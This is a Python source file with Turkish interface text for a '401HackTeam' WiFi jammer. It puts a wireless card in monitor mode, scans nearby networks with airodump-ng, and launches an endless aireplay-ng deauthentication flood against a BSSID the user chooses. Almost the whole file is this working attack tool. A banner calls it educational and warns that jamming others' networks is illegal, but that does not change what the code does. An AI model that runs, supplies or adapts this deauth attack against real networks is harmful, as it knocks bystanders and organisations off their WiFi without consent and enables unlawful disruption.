# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
from colorama import init, Fore, Style

# Renkli çıktılar için Colorama ayarı
init(autoreset=True)

class WifiJammerTool:
    def __init__(self):
        self.clear_screen()
        self.show_banner()
        self.check_root()
        self.check_requirements()
        self.main_menu()

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        print(Fore.CYAN + """
        ╔════════════════════════════════════════════╗
        ║          401HackTeam - WiFi Jammer         ║
        ╠════════════════════════════════════════════╣
        ║    • WiFi Ağlarını Tara                   ║
        ║    • Jammer Başlat                        ║
        ║    • Çıkış (q)                            ║
        ╚════════════════════════════════════════════╝
        """)

    def check_root(self):
        if os.geteuid() != 0:
            print(Fore.RED + "HATA: Bu araç root yetkisi gerektirir!")
            print(Fore.YELLOW + "Lütfen 'sudo python3 script.py' şeklinde çalıştırın.")
            sys.exit(1)

    def check_requirements(self):
        required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
        missing = []
        
        for tool in required_tools:
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except FileNotFoundError:
                missing.append(tool)
        
        if missing:
            print(Fore.RED + "HATA: Gerekli araçlar eksik!")
            print(Fore.YELLOW + "Eksik araçlar: " + ", ".join(missing))
            print(Fore.YELLOW + "Lütfen şu komutlarla kurun:")
            print(Fore.CYAN + "sudo apt-get install aircrack-ng")
            sys.exit(1)

    def scan_wifi(self):
        print(Fore.CYAN + "\n[+] WiFi ağları taranıyor (Ctrl+C ile durdurabilirsiniz)...")
        try:
            # Ağ arabirimini belirle
            interface = self.select_interface()
            if not interface:
                return []

            # Monitor modunu başlat
            self.start_monitor_mode(interface)
            
            # Tarama yap
            cmd = f"airodump-ng {interface}mon"
            process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # 10 saniye tarama yap
            time.sleep(10)
            process.terminate()
            
            # Sonuçları işle
            output = process.communicate()[0].decode('utf-8')
            networks = self.parse_networks(output)
            
            if not networks:
                print(Fore.RED + "[-] Hiç WiFi ağı bulunamadı!")
                return []
            
            print(Fore.GREEN + "\n[+] Bulunan WiFi Ağları:")
            for i, net in enumerate(networks, 1):
                print(f"{Fore.YELLOW}[{i}] BSSID: {net[0]}, Channel: {net[1]}, ESSID: {net[2]}")
            return networks
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nTarama durduruldu.")
            return []
        except Exception as e:
            print(Fore.RED + f"Tarama hatası: {e}")
            return []

    def select_interface(self):
        try:
            # Kullanılabilir ağ arabirimlerini listele
            cmd = "airmon-ng"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Hata kontrolü
            if result.returncode != 0:
                print(Fore.RED + "Ağ arabirimleri listelenemedi!")
                return None
                
            print(Fore.CYAN + "\nKullanılabilir Ağ Arabirimleri:")
            print(result.stdout)
            
            interface = input(Fore.GREEN + "\nKullanmak istediğiniz arabirimi girin (örnek: wlan0): ").strip()
            return interface
            
        except Exception as e:
            print(Fore.RED + f"Arabirim seçme hatası: {e}")
            return None

    def start_monitor_mode(self, interface):
        try:
            print(Fore.CYAN + f"\n[+] {interface} monitor moda alınıyor...")
            
            # Önce mevcut monitor modları kapat
            subprocess.run(f"airmon-ng check kill", shell=True)
            
            # Monitor mod başlat
            cmd = f"airmon-ng start {interface}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "monitor mode enabled" in result.stdout:
                print(Fore.GREEN + f"[+] {interface}mon monitor moda alındı")
                return True
            else:
                print(Fore.RED + "Monitor mod başlatılamadı!")
                return False
                
        except Exception as e:
            print(Fore.RED + f"Monitor mod hatası: {e}")
            return False

    def parse_networks(self, output):
        networks = []
        lines = output.split('\n')
        
        # BSSID'lerin başladığı satırı bul
        start_index = 0
        for i, line in enumerate(lines):
            if "BSSID" in line:
                start_index = i + 1
                break
                
        # Ağları parse et
        for line in lines[start_index:]:
            if "BSSID" in line:  # İkinci başlık satırını atla
                continue
                
            parts = line.strip().split()
            if len(parts) >= 14:
                bssid = parts[0]
                channel = parts[5]
                essid = " ".join(parts[13:])
                networks.append((bssid, channel, essid))
                
        return networks

    def start_jammer(self, bssid, channel, interface):
        print(Fore.RED + "\n⚠️ UYARI: Bu işlem yasa dışıdır! Sadece kendi ağınızda test edin.")
        print(Fore.YELLOW + f"\n[+] {bssid} hedefine jammer başlatılıyor...")
        
        try:
            # Kanalı ayarla
            subprocess.run(f"iwconfig {interface}mon channel {channel}", shell=True)
            
            # Deauth saldırısı başlat
            cmd = f"aireplay-ng --deauth 0 -a {bssid} {interface}mon"
            process = subprocess.Popen(cmd.split())
            
            print(Fore.RED + "\nJammer çalışıyor (Ctrl+C ile durdurabilirsiniz)...")
            process.wait()
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nJammer durduruldu.")
            process.terminate()
        except Exception as e:
            print(Fore.RED + f"Jammer hatası: {e}")

    def main_menu(self):
        networks = []
        interface = ""
        
        while True:
            self.clear_screen()
            self.show_banner()
            
            print(Fore.WHITE + "\n" + "═"*50)
            print(Fore.CYAN + "  [1] WiFi Ağlarını Tara")
            print(Fore.CYAN + "  [2] Jammer Başlat")
            print(Fore.CYAN + "  [q] Çıkış")
            print(Fore.WHITE + "═"*50)
            
            choice = input(Fore.GREEN + "\n>> Seçiminiz (1-2/q): ").strip().lower()
            
            if choice == "1":
                networks = self.scan_wifi()
                if networks:
                    input(Fore.YELLOW + "\n[+] Devam etmek için Enter'a basın...")
                
            elif choice == "2":
                if not networks:
                    print(Fore.RED + "\nÖnce ağları taramanız gerekiyor!")
                    time.sleep(1)
                    continue
                    
                print(Fore.WHITE + "\n" + "═"*50)
                wifi_choice = input(Fore.CYAN + "\n[?] Jam yapmak istediğiniz ağ numarası (q=çıkış): ").strip()
                
                if wifi_choice.lower() == 'q':
                    continue
                
                try:
                    selected = networks[int(wifi_choice)-1]
                    print(Fore.WHITE + "═"*50)
                    
                    confirm = input(Fore.RED + f"\n{selected[2]} ağına jam yapılacak. Onaylıyor musunuz? (e/h): ").lower()
                    if confirm == 'e':
                        if not interface:
                            interface = self.select_interface()
                        self.start_jammer(selected[0], selected[1], interface)
                    else:
                        print(Fore.YELLOW + "\nİşlem iptal edildi.")
                    
                    input(Fore.YELLOW + "\n[+] Devam etmek için Enter'a basın...")
                except (ValueError, IndexError):
                    print(Fore.RED + "Geçersiz numara!")
                    time.sleep(1)
                    
            elif choice == "q":
                print(Fore.BLUE + "\nÇıkılıyor...")
                
                # Monitor modu kapat
                try:
                    subprocess.run("airmon-ng stop wlan0mon", shell=True)
                    subprocess.run("service network-manager restart", shell=True)
                except:
                    pass
                    
                sys.exit(0)
            else:
                print(Fore.RED + "Geçersiz seçim!")
                time.sleep(1)

if __name__ == "__main__":
    # Yasal uyarı
    print(Fore.RED + """
    !!! YASAL UYARI !!!
    Bu araç sadece eğitim amaçlıdır.
    Başkalarının WiFi ağlarına jam/deauth yapmak yasa dışıdır.
    Tüm sorumluluk kullanıcıya aittir.
    """)
    
    confirm = input("Devam etmek istiyor musunuz? (e/h): ").lower()
    if confirm == 'e':
        try:
            WifiJammerTool()
        except KeyboardInterrupt:
            print(Fore.BLUE + "\nProgram sonlandırıldı.")
        except Exception as e:
            print(Fore.RED + f"\nBir hata oluştu: {e}")
    else:
        print(Fore.BLUE + "İptal edildi.")